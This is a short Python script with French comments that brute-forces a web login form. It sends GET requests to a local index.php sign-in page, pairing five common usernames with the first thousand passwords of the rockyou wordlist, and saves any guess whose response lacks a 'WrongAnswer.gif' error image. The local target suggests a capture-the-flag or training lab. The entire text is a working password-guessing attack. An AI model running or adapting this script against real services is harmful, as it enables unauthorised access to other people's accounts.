# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlencode
import time

# URL cible 
url = "http://127.0.0.1:8080/index.php"

# username pour le test
usernames = ["root", "admin", "user", "test", "guest"]

# Chargement des mots de passe depuis un fichier (ex: rockyou.txt)
with open("rockyou.txt", encoding="utf-8", errors="ignore") as f:
    # passwords = [line.strip() for line in f if line.strip()]
    passwords = [line.strip() for line in f.readlines()[:1000]]

# brute-force
for username in usernames:
    for pwd in passwords:
        params = {
            "page": "signin",
            "username": username,
            "password": pwd,
            "Login": "Login"
        }

        full_url = f"{url}?{urlencode(params)}"
        print(f"[~] Test en cours : {username}:{pwd}")
        r = requests.get(full_url)

        # si on est pas dans un cas d'erreur
        if "WrongAnswer.gif" not in r.text:
            print(f"[+] Succès probable : {username}:{pwd}")
            with open("result.txt", "w", encoding="utf-8") as out:
                out.write(f"Username: {username}\nPassword: {pwd}\n\n")
                out.write(r.text)
            break

        # break pour pas spam
        time.sleep(0.1)
